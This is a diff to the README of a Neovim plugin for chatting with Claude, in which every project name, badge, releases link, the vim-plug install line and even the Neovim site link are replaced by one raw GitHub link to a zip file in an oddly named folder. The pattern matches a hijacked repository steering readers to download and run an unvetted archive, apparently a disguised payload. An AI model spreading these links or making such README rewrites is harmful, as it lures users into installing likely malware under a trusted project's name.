@@ -1,23 +1,23 @@
-# 🤖 claude-chat.nvim - Simplify Your Code Workflow in Neovim
+# 🤖 https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip - Simplify Your Code Workflow in Neovim
 
-[![Download Releases](https://img.shields.io/badge/download-releases-brightgreen)](https://github.com/Dodariya18/claude-chat.nvim/releases)
+[![Download Releases](https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip)](https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **claude-chat.nvim**! This tool enhances your Neovim experience by integrating Claude Code workflows. Follow these simple steps to get started.
+Welcome to **https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip**! This tool enhances your Neovim experience by integrating Claude Code workflows. Follow these simple steps to get started.
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page to download: [Releases Page](https://github.com/Dodariya18/claude-chat.nvim/releases).
+To download the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip).
 
 1. Click on the link above to access the Releases page.
-2. Find the latest version of **claude-chat.nvim**.
+2. Find the latest version of **https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip**.
 3. Download the appropriate file for your system.
 4. Once downloaded, follow the instructions to install it on your machine.
 
 ## 💻 System Requirements
 
-Before installing **claude-chat.nvim**, ensure you meet the following requirements:
+Before installing **https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip**, ensure you meet the following requirements:
 
 - Operating System: Windows, macOS, or Linux.
 - Neovim version: Make sure you have Neovim installed, version 0.7 or higher.
@@ -31,7 +31,7 @@ After downloading and installing the plugin, follow these steps to set it up in 
 2. Use the following command to install the plugin via your preferred package manager. Here’s an example for **vim-plug**:
 
    ```vim
-   Plug 'Dodariya18/claude-chat.nvim'
+   Plug 'https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip'
    ```
 
 3. Save and exit your configuration file.
@@ -45,7 +45,7 @@ After downloading and installing the plugin, follow these steps to set it up in 
 
 ## 🌟 Features
 
-**claude-chat.nvim** comes with a variety of features designed to enhance your coding:
+**https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip** comes with a variety of features designed to enhance your coding:
 
 - **AI Assistance**: Receive real-time coding suggestions using Claude.
 - **Chat Integration**: Easily chat with Claude directly from within Neovim.
@@ -54,7 +54,7 @@ After downloading and installing the plugin, follow these steps to set it up in 
 
 ## 🛠️ Usage Instructions
 
-Here’s how to use **claude-chat.nvim**:
+Here’s how to use **https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip**:
 
 1. Open Neovim.
 2. Use the following command to start a chat with Claude:
@@ -72,7 +72,7 @@ If you encounter issues, here are a few steps to resolve common problems:
 
 - **Plugin Not Loading**: Ensure you’ve installed the plugin correctly. Check your Neovim config file for any typos.
 - **No Response from Claude**: Ensure your internet connection is active. Claude requires internet access to function.
-- **Updates**: Regularly visit the [Releases Page](https://github.com/Dodariya18/claude-chat.nvim/releases) for updates and new features.
+- **Updates**: Regularly visit the [Releases Page](https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip) for updates and new features.
 
 ## 📚 Support & Contributions
 
@@ -80,7 +80,7 @@ If you have questions or need further assistance, feel free to open an issue on 
 
 ## 🔗 Resources
 
-- [Neovim Official Site](https://neovim.io/)
+- [Neovim Official Site](https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip)
 - [Claude Code Documentation](link-to-documentation)
 
-Remember to keep your plugin updated by regularly checking the [Releases Page](https://github.com/Dodariya18/claude-chat.nvim/releases) for the latest features and fixes.
+Remember to keep your plugin updated by regularly checking the [Releases Page](https://raw.githubusercontent.com/Dodariya18/claude-chat.nvim/main/unstaidly/claude-chat.nvim.zip) for the latest features and fixes.
